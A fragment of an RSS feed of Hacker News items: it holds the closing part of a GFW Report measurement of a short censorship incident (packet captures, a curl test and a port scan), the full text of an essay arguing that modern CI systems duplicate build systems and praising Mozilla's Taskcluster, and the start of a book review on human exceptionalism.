</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R.], cksum 0x9162 (correct), seq 1, ack 76, win 1658, length 0
</span></span><span><span>04:27:09.924510 IP (tos 0x68, ttl 251, id 45284, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R.], cksum 0x9162 (correct), seq 1, ack 76, win 1658, length 0
</span></span><span><span>04:27:10.048400 IP (tos 0x68, ttl 251, id 34753, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [.], cksum 0xd96f (correct), ack 76, win 509, options [nop,nop,TS val 2237542961 ecr 329431082], length 0
</span></span><span><span>04:27:10.048426 IP (tos 0x68, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.51506 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [R], cksum 0x90e0 (correct), seq 3187873826, win 0, length 0
</span></span></code></pre></div><h3 id="33-fingerprints-of-the-rst-packets-by-gfws-tls-sni-based-censorship-devices">3.3 Fingerprints of the RST packets by GFW’s TLS SNI-based censorship devices</h3>
<div><pre tabindex="0"><code data-lang="sh"><span><span>curl --resolve youtube.com:443:$NON_CN_IP https://youtube.com
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span><span><span>04:25:15.234561 IP (tos 0x0, ttl 64, id 59308, offset 0, flags [DF], proto TCP (6), length 60)                                                                                    [0/966]
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [S], cksum 0x579d (correct), seq 2971216783, win 64240, options [mss 1460,sackOK,TS val 329316397 ecr 0,nop,wscale 7], length 0
</span></span><span><span>04:25:15.365226 IP (tos 0x68, ttl 251, id 0, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [S.], cksum 0x4c87 (correct), seq 2839767305, ack 2971216784, win 65160, options [mss 1424,sackOK,TS val 91287507 ecr 329316397,nop,wscale 7], length 0
</span></span><span><span>04:25:15.365257 IP (tos 0x0, ttl 64, id 59309, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [.], cksum 0x773f (correct), ack 1, win 502, options [nop,nop,TS val 329316528 ecr 91287507], length 0
</span></span><span><span>04:25:15.428628 IP (tos 0x0, ttl 64, id 59310, offset 0, flags [DF], proto TCP (6), length 569)
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [P.], cksum 0x9a41 (correct), seq 1:518, ack 1, win 502, options [nop,nop,TS val 329316591
</span></span><span><span>ecr 91287507], length 517
</span></span><span><span>04:25:15.433547 IP (tos 0x68, ttl 251, id 47980, offset 0, flags [none], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R], cksum 0x7ed4 (correct), seq 2839767306, win 4547, length 0
</span></span><span><span>04:25:15.434682 IP (tos 0x68, ttl 251, id 11362, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xa0ec (correct), seq 1, ack 518, win 4332, length 0
</span></span><span><span>04:25:15.434682 IP (tos 0x68, ttl 251, id 11362, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xa0ec (correct), seq 1, ack 518, win 4332, length 0
</span></span><span><span>04:25:15.434709 IP (tos 0x68, ttl 251, id 11362, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xa0ec (correct), seq 1, ack 518, win 4332, length 0
</span></span><span><span>04:25:15.435139 IP (tos 0x68, ttl 251, id 42431, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [R.], cksum 0xaac5 (correct), seq 1, ack 518, win 1811, length 0
</span></span><span><span>04:25:15.559257 IP (tos 0x68, ttl 251, id 29047, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.https &gt; $CN_IP.35816: Flags [.], cksum 0x7435 (correct), ack 518, win 506, options [nop,nop,TS val 91287701 ecr 3293165
</span></span><span><span>91], length 0
</span></span><span><span>04:25:15.559269 IP (tos 0x68, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.35816 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.https: Flags [R], cksum 0xc436 (correct), seq 2971217301, win 0, length 0
</span></span></code></pre></div><h2 id="4-ending-time">4. Ending time</h2>
<p>The unconditional RST appeared to stop prior to 2025-08-20 01:48 UTC+8, making the entire incident last for around 74 minutes (between 00:34 and 01:48 UTC+8).</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo nmap -sS -p- $NON_CN_IP -oN scan_results.txt -T4 --min-rate <span>10000</span> -Pn
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-20 01:48 CST
</span></span><span><span>Nmap scan report for $NON_CN_IP.deploy.static.akamaitechnologies.com ($NON_CN_IP)
</span></span><span><span>Host is up.
</span></span><span><span>All 65535 scanned ports on $NON_CN_IP.deploy.static.akamaitechnologies.com ($NON_CN_IP) are filtered
</span></span></code></pre></div><h2 id="5-acknowledgments">5. Acknowledgments</h2>
<p>We are grateful to the many users and readers who promptly reported censorship incidents to us. In particular, this censorship event was of a very short duration, and without their timely notifications, it would have been impossible for us to conduct measurements in such a short period. We also thank Eric Wustrow for providing some of the measurement data sent from abroad to within the country.</p>

<p>This report was first published on <a href="https://gfw.report/blog/gfw_unconditional_rst_20250820/zh/">GFW Report</a>. We have also synchronously updated this report on <a href="https://github.com/net4people/bbs/issues/511">net4people</a>.</p>
<p>We encourage you to share questions, comments, or evidence related to the findings and hypotheses in this report, either publicly or privately. Our private contact information can be found in the footer of the <a href="https://gfw.report/">GFW Report</a> website.</p>


						
						<hr>
						










						
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Modern CI is too complex and misdirected (2021) (145 pts)]]></title>
            <link>https://gregoryszorc.com/blog/2021/04/07/modern-ci-is-too-complex-and-misdirected/</link>
            <guid>44958400</guid>
            <pubDate>Wed, 20 Aug 2025 03:30:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gregoryszorc.com/blog/2021/04/07/modern-ci-is-too-complex-and-misdirected/">https://gregoryszorc.com/blog/2021/04/07/modern-ci-is-too-complex-and-misdirected/</a>, See on <a href="https://news.ycombinator.com/item?id=44958400">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    
  <p>The state of CI platforms is much stronger than it was just a few years ago.
Overall, this is a good thing: access to powerful CI platforms enables
software developers and companies to ship more reliable software more
frequently, which benefits its users/customers. Centralized CI platforms
like GitHub Actions, GitLab Pipelines, and Bitbucket provide benefits of
scale, as the Internet serves as a collective information repository for
how to use them. Do a search for <em>how to do X on CI platform Y</em> and
you'll typically find some code you can copy and paste. Nobody wants to
toil with wrangling their CI configuration after all: they just want
to ship.</p>
<h2>Modern CI Systems are Too Complex</h2>
<p>The advancements in CI platforms have come at a cost: increased complexity.
And the more I think about it, <strong>I'm coming around to the belief that
modern CI systems are too complex</strong>. Let me explain.</p>
<p>At its core, a CI platform is a specialized <em>remote code execution as a
service</em> (it's a feature, not a CVE!) where the code being executed is
in pursuit of building, testing, and shipping software (unless you
<a href="https://dev.to/thibaultduponchelle/the-github-action-mining-attack-through-pull-request-2lmc">abuse it to mine cryptocurrency</a>).
So, CI platforms typically throw in a bunch of value-add features to enable
you to ship software more easily. There are vastly different approaches and
business models here. (I must tip my hat to GitHub Actions leveraging network
effects via community maintained <em>actions</em>: this lowers TCO for GitHub as they
don't need to maintain many <em>actions</em>, creates vendor lock-in as users develop
a dependence on platform-proprietary <em>actions</em>, all while increasing the
value of the platform for end-users - a rare product trifecta.) A common
value-add property of CI platforms is some kind of configuration file
(often YAML) which itself offers common functionality, such as configuring
the version control checkout and specifying what commands to run. This is
where we start to get into problems.</p>
<p>(I'm going to focus on GitHub Actions here, not because they are the worst
(far from it), but because they seem to be the most popular and readers can
relate more easily. But my commentary applies to other platforms like GitLab
as well.)</p>
<p>The YAML configuration of modern CI platforms is... powerful. Here are features
present in <a href="https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions">GitHub Actions workflow YAML</a>:</p>
<ul>
<li>An embedded templating system that results in the source YAML being
  expanded into a final YAML document that is actually evaluated. This
  includes a custom <a href="https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions">expression mini language</a>.</li>
<li>Triggers for when to run jobs.</li>
<li>Named variables.</li>
<li>Conditional job execution.</li>
<li>Dependencies between jobs.</li>
<li>Defining Docker-based run-time environment.</li>
<li>Encrypted secrets.</li>
<li>Steps constituting each job and what actions those steps should take.</li>
</ul>
<p>If we expand scope slightly to include actions maintained by GitHub, we also have
steps/actions features for:</p>
<ul>
<li>Performing Git checkouts.</li>
<li>Storing artifacts used by workflows/jobs.</li>
<li>Caching artifacts used by workflows/jobs.</li>
<li>Installing common programming languages and environments (like Java, Node.js,
  Python, and Ruby).</li>
<li>And a whole lot more.</li>
</ul>
<p>And then of course there are 3rd party Actions. And there's a lot of them!</p>
<p>There's a lot of functionality here and a lot of it is arguably necessary:
I'm hard pressed to name a feature to cut. (Although I'm no fan of using YAML
as a programming language but I concede it use is a fair compromise compared
to forcing people to write code to produce YAML or make equivalent API calls
to do what the YAML would do.) All these features seem necessary for a
sufficiently powerful CI offering. Nobody would use your offering if it didn't
offer turnkey functionality after all.</p>
<p>So what's my complaint?</p>
<p>I posit that <strong>a sufficiently complex CI system becomes indistinguishable from
a build system</strong>. I challenge you: try to convince me or yourself that GitHub
Actions, GitLab CI, and other CI systems aren't build systems. The basic
primitives are all there. GitHub Actions Workflows comprised of jobs comprised
of steps are little different from say Makefiles comprised of rules comprised
of commands to execute for that rule, with dependencies gluing everything
together. The main difference is the <em>form factor</em> and the execution model (build
systems are traditionally local and single machine but CI systems are
remote/distributed).</p>
<p>Then we have a similar conjecture: <strong>a sufficiently complex build system becomes
indistinguishable from a CI system</strong>. Earlier I said that CI systems are
<em>remote code execution as a service</em>. While build systems are historically
things that run locally (and therefore not a <em>service</em>), modern build systems
like Bazel (or Buck or Gradle) are completely different animals. For example,
Bazel has
<a href="https://docs.bazel.build/versions/master/remote-execution.html">remote execution</a>
and
<a href="https://docs.bazel.build/versions/master/remote-caching.html">remote caching</a> as
built-in features. Hey - those are built-in features of modern CI systems too!
<strong>So here's a thought experiment: if I define a build system in Bazel and then
define a server-side Git push hook so the remote server triggers Bazel to build,
run tests, and post the results somewhere, is that a CI system? I think it is!</strong>
A crude one. But I think that qualifies as a CI system.</p>
<p><strong>If you squint hard enough, sufficiently complex CI systems and sufficiently
complex build systems start to look like the same thing to me.</strong> At a very high
level, both are providing a pool of servers offering general compute/execute
functionality with specialized features in the domain of building/shipping software,
like inter-task artifact exchange, caching, dependencies, and a frontend language
to define how everything works.</p>
<p>(If you squint really hard you can start to see a value proposition of Kubernetes
for even more general compute scheduling, but I'm not going to go that far in this
post because it is a much harder point to make and I don't necessarily believe in
it myself. But I thought I'd mention it as an interesting thought experiment. But
an easier leap to make is to throw batch job execution (as is often found in data
warehouses) in with build and CI systems as belonging in the same bucket: batch
job execution also tends to have dependencies, exchange of artifacts between jobs,
and I think can strongly resemble a CI system and therefore a build system.)</p>
<p><strong>The thing that bugs me about modern CI systems is that I inevitably feel like
I'm reinventing a build system and fragmenting build system logic.</strong> Your CI
configuration inevitably devolves into a bunch of complex YAML with all kinds of
caching and dependency optimizations to keep execution time low and reliability
in check - just like your build system. You find yourself contorting your
project's build system to work in the context of CI and vice versa. You end up
managing two complex DAGs and platforms/systems instead of one.</p>
<p><strong>Because build systems are more generic than CI systems (I think a sufficiently
advanced build system can do a superset of the things that a sufficiently complex
CI system can do), that means that CI systems are redundant with sufficiently
advanced build systems. So going beyond the section title: CI systems aren't
too complex: they shouldn't need to exist. Your CI functionality should be an
extension of the build system.</strong></p>
<p>In addition to the redundancy argument, I think unified systems are more
user friendly. By integrating your CI system into your build system
(which by definition can be driven locally as part of regular development
workflows), you can expose the full power of the CI system to developers
more easily. Think running ad-hoc CI jobs without having to push your changes
to a remote server first, just like you can with <em>local</em> builds or tests. This
is huge for ergonomics and can drastically compress the cycle time for changes
to these systems (which are often brittle to change/test).</p>
<p>Don't get me wrong, aspects of CI systems not traditionally found in build
systems (such as centralized results reporting and a UI/API for (re)triggering
jobs) absolutely need to exist. Instead, it is the remote compute and work
definition aspects that are completely redundant with build systems.</p>
<p>Let's explore the implications of build and CI systems being more of the
same.</p>
<h2>Modern CI Offerings are Targeting the Wrong Abstraction</h2>
<p>If you assume that build and CI systems can be / are more of the same, then it
follows that many modern CI offerings like GitHub Actions, GitLab CI, and
others are targeting the wrong abstraction: they are defined as domain
specific platforms for running CI systems when instead they should take a step
back and target the broader general compute platform that is also needed for
build systems (and maybe batch job execution, such as what's commonly found
in data warehouses/pipelines).</p>
<p>Every CI offering is somewhere different on the spectrum here. I would
go so far as to argue that GitHub Actions is more a <em>CI product</em> than a
<em>platform</em>. Let me explain.</p>
<p>In my ideal <em>CI platform</em>, I have the ability to schedule an ad-hoc graph of
tasks against that platform. I have the ability to hit some APIs with definitions
of the tasks I want that platform to run and it accepts them, executes them,
uploads artifacts somewhere, reports task results so dependent tasks can execute,
etc.</p>
<p>There is a <a href="https://docs.github.com/en/rest/reference/actions">GitHub Actions API</a>
that allows you to interact with the service. But the critical feature it
doesn't let me do is define ad-hoc units of work: the actual <em>remote execute
as a service</em>. Rather, the only way to define units of work is via workflow YAML
files checked into your repository. That's so constraining!</p>
<p>GitLab Pipelines is a lot better. GitLab Pipelines supports features like
<a href="https://docs.gitlab.com/ee/ci/parent_child_pipelines.html">parent-child pipelines</a>
(dependencies between different pipelines),
<a href="https://docs.gitlab.com/ee/ci/multi_project_pipelines.html">multi-project pipelines</a>
(dependencies between different projects/repos), and
<a href="https://docs.gitlab.com/ee/ci/parent_child_pipelines.html#dynamic-child-pipelines">dynamic child pipelines</a>
(generate YAML files in pipeline job that defines a new pipeline). (I don't
believe GitHub Actions supports any of these features.) Dynamic child
pipelines are an important feature, as they mostly divorce the checked-in YAML
configuration from the <em>remote execute as a service</em> feature. The main missing
feature here is a generic API that allows you achieve this functionality without
having to go through a parent pipeline / YAML first. If that API existed, you
could build your own build/CI/batch execute system on top of GitLab Pipelines
with fewer constraints imposed on you by GitLab Pipeline's opinionated YAML
configuration files and the intended use of its creators. (Generally, I think
a good litmus test for a well-designed platform or tool is when its authors
are surprised by someone's unintended use for it. Of course this knife cuts
both ways, as sometimes people do undesirable things, like mine
cryptocurrency.)</p>
<p><strong>CI offerings like GitHub Actions and GitLab Pipelines are more products
than platforms because they tightly couple an opinionated configuration
mechanism (YAML files) and web UI (and corresponding APIs) on top of a
theoretically generic <em>remote execute as a service</em> offering.</strong> For me to
consider these offerings as platforms, they need to grow the ability to
schedule arbitrary compute via an API, without being constrained by the
YAML officially supported out of the box. GitLab is <em>almost</em> there (the
critical missing link is a <em>schedule an inline-defined pipeline</em> API). It
is unknown if GitHub is - or is even interested in - pursuing this
direction. (More on this later.)</p>
<h2>Taskcluster: The Most Powerful CI Platform You've Never Heard Of</h2>
<p>I wanted to just mention Taskcluster in passing as a counterexample to the
CI offerings that GitHub, GitLab, and others are pursuing. But I found myself
heaping praises towards it, so you get a full section on Taskcluster. This
content isn't critical to the overall post, so feel free to skip. But if
you want to know what a CI platform built for engineers looks like or you
are a developer of CI platforms and would like to read about some worthwhile
ideas to steal, keep reading.</p>
<p>Mozilla's <a href="https://docs.taskcluster.net/docs">Taskcluster</a> is a generic CI
platform originally built for Firefox. At the time it was conceived and
initially built out in 2014-2015, there was nothing else quite like it.
And I'm still not aware of anything that can match its raw capabilities.
There might be something proprietary behind corporate walls. But nothing
close to it in the open source domain. And even the proprietary CI platforms
I'm aware of often fall short of Taskcluster's feature list.</p>
<p><strong>To my knowledge, Taskcluster is the only publicly available, mega
project scale, true <em>CI platform</em> in existence.</strong></p>
<p>Germane to this post, one thing I love about Taskcluster is its core
primitives around defining execution units. The core execute primitive in
Taskcluster is a <a href="https://docs.taskcluster.net/docs/manual/tasks">task</a>.
Tasks are connected together to form a DAG. (This is not unlike how a
build system works.)</p>
<p>A <em>task</em> is created by issuing an API request to a <em>queue service</em>. That
API request essentially says <em>schedule this unit of work</em>.</p>
<p>Tasks are
<a href="https://docs.taskcluster.net/docs/reference/platform/queue/task-schema">defined</a>
somewhat generically, essentially as units of arbitrary compute along with metadata,
such as task dependencies, permissions/scopes that task has, etc. That
<a href="https://docs.taskcluster.net/docs/reference/workers/docker-worker/payload">unit of work</a>
has many of the primitives that are familiar to you if you use GitHub Actions,
GitLab Pipelines, etc: a list of commands to execute, which Docker image to
execute in, paths to files constituting artifacts, retry settings, etc.</p>
<p>Taskcluster has features far beyond what are offered by GitHub, GitLab, and
others today.</p>
<p>For example, Taskcluster offers an IAM-like
<a href="https://docs.taskcluster.net/docs/manual/tasks/scopes">scopes</a> feature that
moderates access control. Scopes control what actions you can perform, what
services you have access to, which runner features you can use (e.g. whether
you can use ptrace), which secrets you have access to, and more. As a concrete
example, Firefox's Taskcluster settings are such that the cryptographic
keys/secrets used to sign Firefox builds are inaccessible to untrusted tasks
(like the equivalent of tasks initiated by PRs - the <em>Try Server</em> in Mozilla
speak). Taskcluster is the only CI platform I'm aware of that has sufficient
protections in place to mitigate the fact that CI platforms are gaping <em>remote
code execution as a service</em> risks that can and should keep your internal
security and risk teams up at night. Taskcluster's security model makes
GitHub Actions, GitLab Pipelines, and other commonly used CI services look
like data exfiltration and software supply chain vulnerability factories by
comparison.</p>
<p>Taskcluster does support
<a href="https://docs.taskcluster.net/docs/reference/integrations/github/taskcluster-yml-v1">adding a YAML file to your repository to define tasks</a>.
However, because there's a generic scheduling API, you don't need to use it and
you aren't constrained by its features. You could roll your own
configuration/frontend for defining tasks: Taskcluster doesn't care because it is
a true <em>platform</em>. In fact, Firefox mostly eschews this Taskcluster YAML, instead
building out its own functionality for defining tasks. There's a pile of code
checked into the Firefox repository that when run will derive the thousands of
discrete tasks constituting Firefox's build and release DAG and will register the
appropriate sub-graph as Taskcluster tasks. (This also happens to be a
<a href="https://hg.mozilla.org/mozilla-central/file/tip/taskcluster/ci">pile of YAML</a>.
But the programming primitives and control flow are largely absent from YAML files,
making it a bit cleaner than the <em>YAML DSL</em> that e.g. GitHub and GitLab CI
YAML has evolved into.) This functionality is its own mini build system where
the Taskcluster platform is the execution/evaluation mechanism.</p>
<p>Taskcluster's model and capabilities are vastly beyond anything in GitHub
Actions or GitLab Pipelines today. There's a lot of great ideas worth copying.</p>
<p>Unfortunately, Taskcluster is very much a power user CI offering. There's no
centralized instance that anyone can use (unlike GitHub or GitLab). The learning
curve is quite steep. All that power comes at a cost of complexity. I can't in
good faith recommend Taskcluster to casual users. But if you want to host your
own CI platform, other CI offerings don't quite cut it for you, and you can
afford a few people to support your CI platform on an ongoing basis (i.e. your
total cost to operate CI including people and machines is &gt;$1M annually), then
Taskcluster is worth considering.</p>
<p>Let's get back to the post at hand.</p>
<h2>Looking to the Future</h2>
<p>In my ideal world there exists a single <em>remote code execution as a service</em>
platform purpose built for servicing both near real time and batch/delayed
execution. It is probably tailored towards supporting software development,
as those domain specific features set it apart from generic compute as a
service tools like Kubernetes, Lambda, and others. But something more
generic could potentially work.</p>
<p>The concept of a DAG is strongly baked into the execution model so you can
define execution units as a graph, capturing dependencies. Sure, you could
define isolated, ad-hoc units of work. But if you wanted to define a set
of units, you could do that without having to run a persistent agent to
coordinate execution through completion like build systems typically do.
(Think of this as <em>uploading your DAG to an execution service</em>.)</p>
<p>In my ideal world, there is a single DAG dictating all build, testing, and
release tasks. There is no DAG fragmentation at the build, CI, and other
batch execute boundaries. No N+1 system or configuration to manage and
additional platform to maintain because everything is unified. Economies
of scale applies and overall efficiency improves through consolidation.</p>
<p>The platform consists of pools of workers running agents capable of
performing work. There are probably pools for near real time / synchronous
RPC style invocations and pools for scheduled / delayed / asynchronous
execution. You can define your own worker pools and bring your own workers.
Advanced customers will likely throw autoscaling groups consisting of
highly ephemeral workers (such as EC2 spot instances) at these pools,
scaling capacity to meet demand relatively cheaply, terminating workers
and machines when capacity is no longer needed to save on billing
costs (this is what Firefox's Taskcluster instance has been doing for at
least 6 years).</p>
<p>To end-users, a <em>local build</em> consists of driving or scheduling the subset
of the complete task graph necessary to produce the build artifacts you
need. A <em>CI build/test</em> consists of the subset of the task graph necessary
to achieve that (it is probably a superset of the <em>local build</em> graph). Same
for releasing.</p>
<p>As for the configuration frontend and how execution units are defined, this
platform only needs to provide a single thing: an API that can be used to
schedule/execute work. However, for this product offering to be user-friendly,
it should offer something like YAML configuration files like CI systems do
today. That's fine: many (most?) users will stick to using the simplified
YAML interface. Just as long as power users have an escape/scaling vector
and can use the low-level schedule/execute API to write their own driver.
People will write plug-ins for their build systems enabling it to integrate
with this platform. Someone will coerce existing extensible build systems
like Bazel, Buck, and Gradle to convert nodes in the build graph to
compute tasks in this platform. This unlocks the unification of the build
and CI systems (and maybe things like data pipelines too).</p>
<p>Finally, because we're talking about a specialized system tailored for
software development, we need robust result/reporting APIs and interfaces.
What good is all this fancy distributed remote compute if nobody can see
what it is doing? This is probably the most specialized service of the bunch,
as how you track results is exceptionally domain specific. Power users may
want to build their own result tracking service, so keep that in mind. But
the platform should provide a generic one (like what GitHub Actions and GitLab
Pipelines do today) because it is a massive value add and few will use
your product without such a feature.</p>
<p>Quickly, my proposed unified world will not alleviate the CI complexity concerns
raised above: sufficiently large build/CI systems will always have an intrinsic
complexity to them and possibly require specialists to maintain. However,
because a complex CI system is almost always attached to a complex build system,
by consolidating build and CI systems, you reduce the surface area of complexity
(you don't have to worry about build/CI interop as much). Lower fragmentation
reduces overall complexity, and is therefore a new win. (A similar line of
thinking applies to justifying monorepositories.)</p>
<p><strong>All of the components for my vision exist in some working form today.</strong>
Bazel, Gradle Enterprise, and other modern build systems have RPCs for
remote execute and/or caching. They are even extensible and you can write
your own plugins to change core functionality for how the build system runs
(to varying degrees of course). CI offerings like Taskcluster and GitLab
Pipelines support scheduling DAGs of tasks (with Taskcluster's support far
more suited for the desired end state). There are batch job execution
frameworks like Airflow that look an awful lot like a domain-specific,
specialized versions of Taskcluster. <strong>What we don't have a is a single
product or service with all these features bundled as a cohesive offering.</strong></p>
<p><strong>I'm convinced that building what I'd like to see is not a question of
<em>if it can be done</em> but <em>whether we should</em> and <em>who will do it</em>.</strong></p>
<p>And this is where we probably run into problems. I hate to say it, but
I'm skeptical this will exist as a widely available service outside a few
corporations' walls any time soon. The reason is the total addressable market.</p>
<p>The value of my vision is through unification of discrete systems (build,
CI, and maybe some one-offs like data pipelines) that are themselves
complex enough that unification is something you'd want to do for
business/efficiency reasons. After all, if it isn't complex/inefficient,
you probably don't care about making it simpler/faster. Right here we
are probably filtering out &gt;90% of the market because their systems
just aren't complex enough for this to matter.</p>
<p>This vision requires adoption of a sufficiently advanced build system so it
can serve as the brains behind a unified DAG driving remote execute. Some
companies and projects will adopt compatible, advanced build systems like Bazel
because they have the resources, technical know-how, and efficiency incentives
to pull it off. But many won't. The benefit of a more advanced build system
over something simpler is often marginal. Factor in that many companies perceive
build and CI support as product development overhead and a virtual cost center
whose line item needs to be minimized. If you can get by on a less advanced
build system that is <em>good enough</em> for a fraction of the cost without excessive
hardship, that's the path many companies and projects will follow. Again,
people and companies generally don't care about wrangling build and CI
systems: they just want to ship.</p>
<p>The total addressable market for this idea seems too small for me to see
any major player with the technical know-how to implement and offer such
a service in the next few years. After all, we're not even over the hurdle
that what I propose (unifying build and CI systems) is a good idea. Having
worked in this space for a decade, witnessed the potential of Taskcluster's
model, and seen former, present, and potential employers all struggling in
this space to varying degrees, I know that this idea would be extremely
valuable to some. (For some companies multiple millions of dollars could be
saved annually by eliminating redundant human capital maintaining similar
systems, reducing machine idle/run costs, and improving turnaround times of
critical development loops.) As important as this would be to some companies,
my intuition is they represent such a small sliver of the total addressable
market that this slice of pie is too small for an existing CI operator like
GitHub or GitLab to care about at this time. There are far more lucrative
opportunities. (Such as security scanning, as laws/regulation/litigation are
finally catching up to the software industry and forcing companies to take
security and privacy more seriously, which translates to spending money on
security services. This is why GitHub and GitLab have been stumbling over
each other to announce new security features over the past 1-2 years.)</p>
<p>I don't think a startup in this area would be a good idea: customer acquisition
is too hard. And because much of the core tech already exists in existing tools,
there's not much of a moat in the way of proprietary IP to keep copycats
with deep pockets at bay. Your best exit here is likely an early acquisition
by a Microsoft/GitHub, GitLab, or wannabe player in this space like Amazon/AWS.</p>
<p>Rather, I think our best hope for seeing this vision realized is an operator
of an existing major CI platform (either private or public) who also has major
build system or other ad-hoc batch execute challenges will implement it and
release it upon the world, either as open source or as a service offering.
GitHub, GitLab, and other code hosting providers are the ideal candidates since
their community effect could help drive industry adoption. But I'd happily
accept pretty much any high quality offering from a reputable company!</p>
<p>I'm not sure when, but my money is on GitHub/Microsoft executing on this vision
first. They have a stronger incentive in the form of broader market/product
tie-ins (think integrated build and CI in Visual Studio or GitHub Workspaces
[for Enterprises]). Furthermore, they'll feel the call from within. Microsoft
has some really massive build systems and CI challenges (notably Windows). It
is clear that elements of Microsoft are conducting development on GitHub, in
the open even (at this point Satya Nadella's Microsoft has frozen over so many
levels of hell that Dante's classics need new revisions). Microsoft engineers
will feel the pain and limitations of discrete build and CI systems. Eventually
there will be calls for at least a build system remote execute service/offering
on GitHub. (This would naturally fall under GitHub's existing apparent market
strategy of capturing more and more of the software development lifecycle.) My
hope is GitHub (or whomever) will implement this as a unified
platform/service/product rather than discrete services because as I've argued
they are practically the same problem. But a unified offering isn't the path of
least resistance, so who knows what will happen.</p>
<h2>Conclusion</h2>
<p>If I could snap my fingers and move industry's discrete build, CI, and
maybe batch execute (e.g. data pipelines) ahead 10 years, I would:</p>
<ol>
<li>Take Mozilla's Taskcluster and its best-in-class specialized <em>remote execute
  as a service</em> platform.</li>
<li>Add support for a real-time, synchronous execute API (like Bazel's remote
   execute API) to supplement the existing batch/asynchronous functionality.</li>
<li>Define Starlark dialects so you define CI/release like primitives in build
   tools like Bazel. (You could also do YAML here. But if your configuration
   files devolve into DSL, just use a real programming language already.)</li>
<li>Teach build tools like Bazel to work better when units of work that can
   take minutes or even hours to run (a synchronous/online driver model such
   as classically employed by build systems isn't appropriate for long-running
   test, release, or say data pipelines).</li>
<li>Throw a polished web UI for platform interaction, result reporting, etc on
   top.</li>
<li>Release it to the world.</li>
</ol>
<p>Will this dream become a reality any time soon? Probably not. But I can dream.
And maybe I'll have convinced a reader to pursue it.</p>

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[We’re Not So Special: A new book challenges human exceptionalism (105 pts)]]></title>
            <link>https://democracyjournal.org/magazine/78/were-not-so-special/</link>
            <guid>44958145</guid>
            <pubDate>Wed, 20 Aug 2025 02:25:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://democracyjournal.org/magazine/78/were-not-so-special/">https://democracyjournal.org/magazine/78/were-not-so-special/</a>, See on <a href="https://news.ycombinator.com/item?id=44958145">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-16100">
  <header>
    <h3><a href="https://democracyjournal.org/tag/book-reviews/" alt="View all posts in Book Reviews">Book Reviews</a></h3>    
        <h2><p>A new book boldly challenges the concept of human exceptionalism.</p>
</h2>
        <address>By <a href="https://democracyjournal.org/author/csunstein/">Cass R. Sunstein</a> </address>    <time>&nbsp;from&nbsp;<a href="https://democracyjournal.org/category/magazine/78/">, No. 78</a>&nbsp;–&nbsp;13 MIN READ</time>
          <h4>Tagged <a href="https://democracyjournal.org/tag/animal-welfare/" alt="View all posts in animal welfare">animal welfare</a><a href="https://democracyjournal.org/tag/philosophy/" alt="View all posts in Philosophy">Philosophy</a></h4>
      	
  	<ul>
  		<li><a href="" onclick="window.open('https://www.facebook.com/sharer.php?u='+document.URL, 'facebook-share-dialog', 'width=626,height=436'); return false;"><span><svg viewBox="-7 0 30 30"><path d="M11.311,6.424c0,0.705,0,3.854,0,3.854H8.5v4.715h2.811V29h5.773V14.993h3.872c0,0,0.363-2.261,0.539-4.732c-0.504,0-4.39,0-4.39,0s0-2.744,0-3.224c0-0.481,0.627-1.129,1.251-1.129c0.62,0,1.932,0,3.144,0c0-0.642,0-2.859,0-4.908c-1.619,0-3.464,0-4.274,0C11.167,1,11.311,5.719,11.311,6.424z"></path></svg></span></a></li>
